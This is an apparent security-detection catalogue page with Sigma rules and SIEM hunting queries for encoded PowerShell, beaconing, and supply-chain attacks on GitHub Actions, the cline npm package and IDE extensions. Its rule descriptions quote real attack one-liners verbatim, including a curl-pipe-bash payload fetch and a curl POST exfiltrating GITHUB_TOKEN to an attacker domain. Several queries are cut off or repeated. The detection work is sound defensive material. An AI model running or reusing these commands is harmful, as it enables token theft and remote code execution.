title: Obfuscated / Encoded PowerShell Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d08
status: experimental
description: |
    PowerShell launched with -EncodedCommand, base64 strings, hidden
    window, no-profile, bypass policy, IEX / Invoke-Expression / Net
    .WebClient.DownloadString — combinations indicating evasion.
references:
    - https://attack.mitre.org/techniques/T1059/001/
    - https://attack.mitre.org/techniques/T1027/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059.001
    - attack.t1027
    - attack.execution
    - attack.defense-evasion
logsource:
    category: process_creation
    product: windows
detection:
    selection_image:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_args:
        CommandLine|contains:
            - '-enc '
            - 'EncodedCommand'
            - 'FromBase64String'
            - 'Invoke-Expression'
            - 'IEX('
            - 'DownloadString'
            - 'Net.WebClient'
            - '-w hidden'
            - '-WindowStyle Hidden'
            - '-nop'
            - '-NoProfile'
            - '-ep bypass'
            - '-ExecutionPolicy Bypass'
    condition: selection_image and selection_args
falsepositives:
    - DevOps tooling that legitimately uses encoded command for
      cross-shell escaping
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.process_name IN ("powershell.exe","pwsh.exe")
      AND (Processes.process="*-enc *" OR Processes.process="*EncodedCommand*"
        OR Processes.process="*FromBase64String*" OR Processes.process="*-nop*"
        OR Processes.process="*-w hidden*" OR Processes.process="*Invoke-Expression*"
        OR Processes.process="*IEX(*" OR Processes.process="*DownloadString*"
        OR Processes.process="*Net.WebClient*")
    by Processes.dest, Processes.user, Processes.process_name, Processes.process, Processes.parent_process_name
| `drop_dm_object_name(Processes)`

// in the article instead of a generic technique-class template.

| where Timestamp > ago(30d)
| where (FileName in~ ("setup.js", "index.js", "aes.js", "cipher-core.js", "core.js", "node.js", "wt.exe", "6202033.ps1", "6202033.vbs", "stepsecurity-dev-machine-guard.sh", "dev-machine-guard.sh") or ProcessCommandLine has_any ("-WindowStyle Hidden"))

DeviceFileEvents

| project Timestamp, DeviceName, AccountName, FolderPath,
          FileName, ActionType, InitiatingProcessFileName,
          InitiatingProcessCommandLine
| order by Timestamp desc

Dev Machine Guard Is Now Open Source: See What's Really Running on Your Developer Machine

StepSecurity
2026-04-09 1 use case 2 techniques 4 kill-chain phases detected

Datadog's State of DevSecOps 2026 report confirms what StepSecurity has been warning about for years: CI/CD pipelines and GitHub Actions are prime targets for supply chain attacks. Learn how StepSecurity's platform directly mitigates every major risk identified in the report, from unpinned actions to day-of-release dependencies.

ATT&CKT1190 T1195.002
Click any ATT&CK pill below to open it on the Matrix
Phase 1
Reconnaissance

Phase 2
Weaponization

Phase 3
Delivery
Detected
Phase 4
Exploitation
Detected
Phase 5
Installation
Likely
Phase 6
Command & Control
Likely
Phase 7
Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.

      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
High

hackerbot-claw: An AI-Powered Bot Actively Exploiting GitHub Actions - Microsoft, DataDog, and CNCF Projects Hit So Far

StepSecurity
2026-04-09 10 use cases 4 techniques 6 kill-chain phases detected

A week-long automated attack campaign targeted CI/CD pipelines across major open source repositories, achieving remote code execution in at least 4 out of 5 targets. The attacker, an autonomous bot called hackerbot-claw, used 5 different exploitation techniques and successfully exfiltrated a GitHub token with write permissions from one of the most popular repositories on GitHub. This post breaks down each attack, shows the evidence, and explains what you can do to protect your workflows.

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — hackerbot-claw: An AI-Powered Bot Actively Exploiting GitHub Actions - Microsoft
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] hackerbot-claw second-stage download: curl -sSfL pipe-bash from hackmoltrepeat.com/molt
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] hackerbot-claw payload host: DNS/HTTP egress to hackmoltrepeat.com (C2 + exfil) · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] hackerbot-claw token exfiltration: curl POST with GITHUB_TOKEN to recv.hackmoltrepeat.com · Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
[LLM] hackerbot-claw payload host: DNS/HTTP egress to hackmoltrepeat.com (C2 + exfil) Command & Control High
Identifies hosts (CI/CD runners, build agents, developer workstations) that resolve or connect to hackmoltrepeat.com or its recv subdomain - the single network destination shared by every hackerbot-claw exploitation attempt across Microsoft, DataDog, CNCF and other affected repos. The /molt path delivers the second-stage payload; recv.hackmoltrepeat.com receives exfiltrated GITHUB_TOKEN values. Rationale: Domain hackmoltrepeat.com and subdomain recv.hackmoltrepeat.com are pre-extracted IOCs from the article and are the single network destination shared by all 5 exploitation techniques. The /molt URI path is the second-stage payload endpoint named verbatim in the article (Block 2: `curl -sSfL hackmoltrepeat.com/molt | bash`). Any DNS or HTTP resolution to this domain family is virtually pathognomonic of hackerbot-claw activity.

[LLM] hackerbot-claw second-stage download: curl -sSfL pipe-bash from hackmoltrepeat.com/molt Installation High
Detects the exact bash one-liner used as the payload across every hackerbot-claw exploitation attempt: `curl -sSfL hackmoltrepeat.com/molt | bash`. Targets self-hosted GitHub Actions runners, build agents, and developer workstations where the second-stage script executed. Rationale: Command-line string `curl -sSfL hackmoltrepeat.com/molt | bash` is verbatim from the article (Block 2) and is the SAME payload delivered by all 5 attack techniques (Pwn Request, direct script injection, branch-name injection, etc.). The flag combination `-sSfL` (silent, show-errors, fail-on-HTTP-error, follow-redirects) plus the literal `/molt` path is a high-fidelity fingerprint that won't collide with legitimate curl usage.

[LLM] hackerbot-claw token exfiltration: curl POST with GITHUB_TOKEN to recv.hackmoltrepeat.com Actions on Objectives High
Detects the specific token-theft curl invocation used by hackerbot-claw in avelino/awesome-go PR #6069 and other successful compromises: `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" https://recv.hackmoltrepeat.com/`. The combination of GITHUB_TOKEN reference + recv.hackmoltrepeat.com destination is virtually pathognomonic of this campaign. Rationale: The article (Attack 1, avelino/awesome-go) shows the exact exfil payload verbatim: `curl -s -H "Authorization: Bearer $GITHUB_TOKEN" -d "token=$GITHUB_TOKEN&repo=$GITHUB_REPOSITORY" https://recv.hackmoltrepeat.com/`. The conjunction of the literal string GITHUB_TOKEN with the recv.hackmoltrepeat.com hostname in a single process command-line is a near-zero-FP signal because legitimate workflows never POST $GITHUB_TOKEN to externally-controlled domains. Image [5] in the article (PR #6069 malicious init function) is the source of the exact code snippet.

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

Cline Supply Chain Attack Detected: cline@2.3.0 Silently Installs OpenClaw

StepSecurity
2026-04-09 8 use cases 3 techniques 6 kill-chain phases detected

cline@2.3.0

CVEsCVE-2026-25253
ATT&CKT1190 T1195.002 T1528

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Cline Supply Chain Attack Detected: cline@2.3.0 Silently Installs OpenClaw
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] npm postinstall chain installs malicious 'openclaw' global package (cline@2.3.0 supply-chain IOC) · [LLM] OpenClaw persistence — launchd plist / systemd unit drop referencing 'openclaw'
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] OpenClaw Gateway WebSocket listener / loopback connection on TCP 18789
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Access to OpenClaw credential store (~/.openclaw/credentials/, ~/.openclaw/config.json5) · OAuth consent / suspicious app grant
[LLM] npm postinstall chain installs malicious 'openclaw' global package (cline@2.3.0 supply-chain IOC) Installation High
Hunts the smoking-gun command emitted by the cline@2.3.0 postinstall hook: 'npm install -g openclaw@latest'. Any device or CI runner where node/npm spawns this exact subcommand received the OpenClaw implant. Optionally surface the parent 'npm install cline' / 'npm i cline' to attribute the chain. Rationale: Anchored on the verbatim postinstall command from the article ('npm install -g openclaw@latest') and the bookend package name 'openclaw'. The npm/node parent narrows scope to dependency-resolution flows so an analyst typing the literal package name in chat won't trigger. cline-parent enrichment attributes the supply-chain pivot.
ATT&CKT1195.002 T1059.007 T1505.001
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine has "openclaw"
| where (FileName in~ ("npm","npm.cmd","node","node.exe","npm-cli.js") or InitiatingProcessFileName in~ ("npm","npm.cmd","node","node.exe"))
| where ProcessCommandLine matches regex @"(?i)\b(install|i|add)\b(\s+--global|\s+-g)?\s+openclaw"
   or ProcessCommandLine matches regex @"(?i)\bopenclaw(@(latest|[\d\.]+))?\b"
| extend SupplyChainParent = iff(InitiatingProcessCommandLine has_cs "cline" or InitiatingProcessParentFileName in~ ("npm","node"), "cline@2.3.0 postinstall (suspected)", "")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, SupplyChainParent
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where ActingProcessName matches regex @"(?i)(^|[\\/])(npm|npm\.cmd|node|node\.exe|npm-cli\.js)$"
   or ActingProcessCommandLine matches regex @"(?i)\bnpm\b"
| where ActingProcessCommandLine matches regex @"(?i)\b(install|^i$|add)\b\s+(--global\s+|-g\s+)?openclaw(@\S+)?"
| extend SupplyChainParent = iff(ParentProcessCommandLine has_cs "cline" or ActingProcessCommandLine has "cline", "cline@2.3.0 postinstall (suspected)", "")
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine, SupplyChainParent
| order by TimeGenerated desc
title: Malicious 'openclaw' npm Global Install (cline@2.3.0 Supply Chain)
id: 6a3f9b0e-2d57-4d6a-a6c8-f5b1c8e8d2a1
status: experimental
description: Detects 'npm install -g openclaw' command — the IOC emitted by the malicious cline@2.3.0 postinstall hook (StepSecurity disclosure, Feb 2026). Any dev or CI host running this received the OpenClaw implant.
references:
  - https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.initial_access
  - attack.t1195.002
  - attack.execution
  - attack.t1059.007
logsource:
  category: process_creation
detection:
  selection_npm:
    Image|endswith:
      - '/npm'
      - '/node'
      - '\npm.cmd'
      - '\node.exe'
  selection_cmd:
    CommandLine|re|i: '\b(install|add)\b(\s+--global|\s+-g)?\s+openclaw'
  condition: selection_npm and selection_cmd
falsepositives:
  - Intentional reinstall of a legitimate fixed 'openclaw' release (verify version > the audited safe baseline)
level: high
(source:windows.sysmon OR source:linux.auditd OR source:windows.security) (@CommandLine:(*openclaw* OR *OpenClaw*) OR @process.command_line:(*openclaw* OR *OpenClaw*)) (@Image:(*\node.exe OR *\npm.cmd OR */npm OR */node) OR @process.executable.path:(*/npm OR */node OR *\node.exe))
#event_simpleName=ProcessRollup2
| ImageFileName=/(^|[\\\/])(npm(\.cmd)?|node(\.exe)?|npm-cli\.js)$/i OR ParentBaseFileName=/(^|[\\\/])(npm(\.cmd)?|node(\.exe)?)$/i
| regex("(?i)\\b(install|add)\\b(\\s+(--global|-g))?\\s+openclaw", field=CommandLine)
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName], function=count())

[LLM] OpenClaw Gateway WebSocket listener / loopback connection on TCP 18789 Command & Control High
Hunts the OpenClaw 'Gateway' daemon — a WebSocket server on ws://127.0.0.1:18789 that exposes operator API commands. Surfaces either the listening socket creation OR a process connecting to localhost:18789 (the attack surface where CVE-2026-25253 is exploited via a crafted role:operator handshake). Rationale: Port 18789 + loopback is verbatim from the article ('WebSocket server on ws://127.0.0.1:18789'). The combination is highly specific — random localhost services on this exact port are vanishingly rare, and the implant always exposes this endpoint.
ATT&CKT1071.001 T1219
Data sourcesNetwork_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where (LocalPort == 18789 and LocalIP in ("127.0.0.1","::1"))
     or (RemotePort == 18789 and RemoteIP in ("127.0.0.1","::1"))
| where ActionType in ("ListeningConnectionCreated","ConnectionSuccess","ConnectionAttempt","InboundConnectionAccepted")
| project Timestamp, DeviceName, ActionType, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, InitiatingProcessAccountName, LocalIP, LocalPort, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
ImNetworkSession
| where TimeGenerated > ago(30d)
| where (DstPortNumber == 18789 and DstIpAddr in ("127.0.0.1","::1"))
     or (SrcPortNumber == 18789 and SrcIpAddr in ("127.0.0.1","::1"))
| project TimeGenerated, DvcHostname, EventType, SrcIpAddr, SrcPortNumber, DstIpAddr, DstPortNumber, NetworkProtocol, NetworkApplicationProtocol
| order by TimeGenerated desc

[LLM] Access to OpenClaw credential store (~/.openclaw/credentials/, ~/.openclaw/config.json5) Actions on Objectives High
Surfaces reads/writes against the OpenClaw secret-bearing files — ~/.openclaw/credentials/ and ~/.openclaw/config.json5 — which the article identifies as the primary loot target on a victim host. Any file event under these paths confirms the implant is active and/or is being plundered. Rationale: The article enumerates these exact paths as the credential reading targets for the operator API. [LLM] OpenClaw persistence — launchd plist / systemd unit drop referencing 'openclaw' Installation High
Catches the daemon-install step the article calls out explicitly: OpenClaw drops a launchd plist (macOS) or systemd unit (Linux) so the Gateway survives reboot. Any file create under /Library/Launch* or /etc/systemd/system, or ~/.config/systemd/user, whose name or content references openclaw is the persistence smoking gun. Rationale: Article explicitly states OpenClaw 'installs a persistent Gateway daemon (via launchd on macOS or systemd on Linux) that remains running in the background'. The persistence path + the openclaw/clawdbot/moltbot brand strings give a clean, single-selection detection with effectively no legitimate FP outside of sanctioned OpenClaw deployments.
ATT&CKT1543.004 T1543.002
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath has_any ("/Library/LaunchDaemons","/Library/LaunchAgents","/etc/systemd/system","/etc/systemd/user","/.config/systemd/user")
| where FileName has_any ("openclaw","clawdbot","moltbot") or FolderPath has_any ("openclaw","clawdbot","moltbot")
| project Timestamp, DeviceName, ActionType, FolderPath, FileName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where EventType in ("FileCreated","FileModified","FileCreate")
| where TargetFilePath matches regex @"(?i)(^|/)(Library/Launch(Daemons|Agents)|etc/systemd/(system|user)|\.config/systemd/user)/"
| where TargetFileName matches regex @"(?i)(openclaw|clawdbot|moltbot)" or TargetFilePath matches regex @"(?i)(openclaw|clawdbot|moltbot)"
| project TimeGenerated, DvcHostname, EventType, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName
| order by TimeGenerated desc

// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-25253")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-25253")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

    where Filesystem.action IN ("created","modified")
      AND (Filesystem.file_name IN ("bun.sh"))
    by Filesystem.dest, Filesystem.user, Filesystem.process_name,
       Filesystem.file_path, Filesystem.file_name
| `drop_dm_object_name(Filesystem)`
]

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Outbound fetch of attacker-controlled autoimport VSIX from ColossusQuailPray GitHub release
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — GlassWorm goes native: New Zig dropper infects every IDE on your machine
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] GlassWorm Zig dropper native node addon (win.node/mac.node) written to IDE extension bin/ folder · [LLM] Force-install of IDE extension via cmd.exe with --install-extension flag spawned by node host · Suspicious browser extension installation · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Infostealer — non-browser process accessing browser cookie/login DBs · Crypto-wallet file/keystore access by non-wallet process
[LLM] GlassWorm Zig dropper native node addon (win.node/mac.node) written to IDE extension bin/ folder Installation High
Hunts for the GlassWorm Zig-compiled native Node addon dropped as win.node or mac.node inside any VS Code/Cursor/Windsurf extension's bin/ subdirectory. Matches the two confirmed SHA256s from Aikido's analysis OR the filename-in-path pattern that the malicious extension uses, since GlassWorm reuses this loader trick across rebrands. Rationale: Hash and path are both directly from the Aikido article's IOC table; the SHA256s are vendor-attributed to win.node/mac.node and the path/name shape is the documented drop location (extension's ./bin/ directory). Filename matching is bounded by the IDE extension-store paths (.vscode/.cursor/.windsurf/.vscode-oss/Positron) so it remains article-specific even if the attacker rotates hashes. Cross-checked with The Hacker News and SecurityAffairs which independently corroborate the same filenames and SHA256s. Cross-checked against: • https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html • https://securityaffairs.com/190638/malware/glassworm-evolves-with-zig-dropper-to-infect-multiple-developer-tools.html • https://cybersecuritynews.com/trojanized-openvsx-extension-spreads-glassworm/
ATT&CKT1195.002 T1129 T1059.007

                    "112d1b33dd9b0244525f51e59e6a79ac5ae452bf6e98c310e7b4fa7902e4db44"))

               or FolderPath has @"\.vscode-oss\extensions\"

               or FolderPath has @"\Positron\"
               or FolderPath has "/.vscode/extensions/"
               or FolderPath has "/.cursor/extensions/"
               or FolderPath has "/.windsurf/extensions/")

| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath, FileName, SHA256
| order by Timestamp desc

[LLM] Force-install of IDE extension via cmd.exe with --install-extension flag spawned by node host Installation High
Detects the GlassWorm Zig dropper's lateral-IDE infection step: the native addon shells out via cmd.exe with the distinctive `/d /e:ON /v:OFF /c` flag set to invoke the per-IDE CLI installer (code.cmd, code-insiders.cmd, cursor.cmd, windsurf.cmd, codium.cmd, positron.cmd) with `--install-extension`. Legitimate users almost never trigger extension installs from cmd.exe scripted by another process. Rationale: The exact command-line skeleton `cmd.exe /d /e:ON /v:OFF /c "<ide_path> --install-extension <vsix_path>"` is reproduced verbatim from the Aikido article. The IDE CLI list (code.cmd, code-insiders.cmd, cursor.cmd, windsurf.cmd, codium.cmd, positron.cmd) is the article's full Windows enumeration table. Combining the unusual cmd.exe flag triplet with --install-extension and a non-Explorer parent isolates programmatic force-installs from a human invoking a CLI. Cross-checked against: • https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html • https://cybersecuritynews.com/trojanized-openvsx-extension-spreads-glassworm/
ATT&CKT1059.003 T1195.002 T1546
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "cmd.exe"
| where ProcessCommandLine has "--install-extension"
| where ProcessCommandLine has "/d" and ProcessCommandLine has "/e:ON" and ProcessCommandLine has "/v:OFF"
| where ProcessCommandLine has_any ("code.cmd","code-insiders.cmd","cursor.cmd","windsurf.cmd","codium.cmd","positron.cmd")
| where AccountName !endswith "$"
| where InitiatingProcessFileName !in~ ("explorer.exe","msiexec.exe")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentFile  = InitiatingProcessFileName,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildCmd    = ProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(30d)
| where TargetProcessName =~ "cmd.exe" or TargetProcessName endswith "\\cmd.exe"
| where TargetProcessCommandLine has "--install-extension"
| where TargetProcessCommandLine has "/d" and TargetProcessCommandLine has "/e:ON" and TargetProcessCommandLine has "/v:OFF"
| where TargetProcessCommandLine has_any ("code.cmd","code-insiders.cmd","cursor.cmd","windsurf.cmd","codium.cmd","positron.cmd")
| where ActorUsername !endswith "$"
| where ParentProcessName !in~ ("explorer.exe","msiexec.exe")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessCommandLine
| order by TimeGenerated desc

id: 5b8f1cd9-2e0b-4d83-aa55-8b6f0c2e7f44
status: experimental
description: Detects the GlassWorm Zig dropper's IDE-infection routine that shells out via cmd.exe with the very specific flag combination /d /e:ON /v:OFF /c to invoke a VS Code-family CLI (code.cmd, code-insiders.cmd, cursor.cmd, windsurf.cmd, codium.cmd, positron.cmd) with --install-extension to silently install the second-stage autoimport-2.7.9.vsix into every IDE on the box.

author: SOC Detection Engineering

[LLM] Outbound fetch of attacker-controlled autoimport VSIX from ColossusQuailPray GitHub release Delivery High
Detects the GlassWorm second-stage payload download: the Zig dropper fetches autoimport-2.7.9.vsix from https://github.com/ColossusQuailPray/oiegjqde/releases/download/12/ to /tmp before silently installing it into every IDE. Both the GitHub username and the file path are uniquely attributed to this campaign. Rationale: The full URL `https://github.com/ColossusQuailPray/oiegjqde/releases/download/12/autoimport-2.7.9.vsix` is published in the article's IOC list; both the GitHub user `ColossusQuailPray` and the VSIX filename `autoimport-2.7.9.vsix` are unique campaign artifacts with no legitimate use, giving an essentially zero-FP signal. We also pivot through DeviceFileEvents.FileOriginUrl so the same indicator is caught even when SSL inspection is missing. Corroborated by THN and SecurityAffairs which both restate the GitHub release URL. Cross-checked against: • https://thehackernews.com/2026/04/glassworm-campaign-uses-zig-dropper-to.html • https://securityaffairs.com/190638/malware/glassworm-evolves-with-zig-dropper-to-infect-multiple-developer-tools.html • https://www.scworld.com/brief/glassworm-uses-zig-binary-to-infect-multiple-ides

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
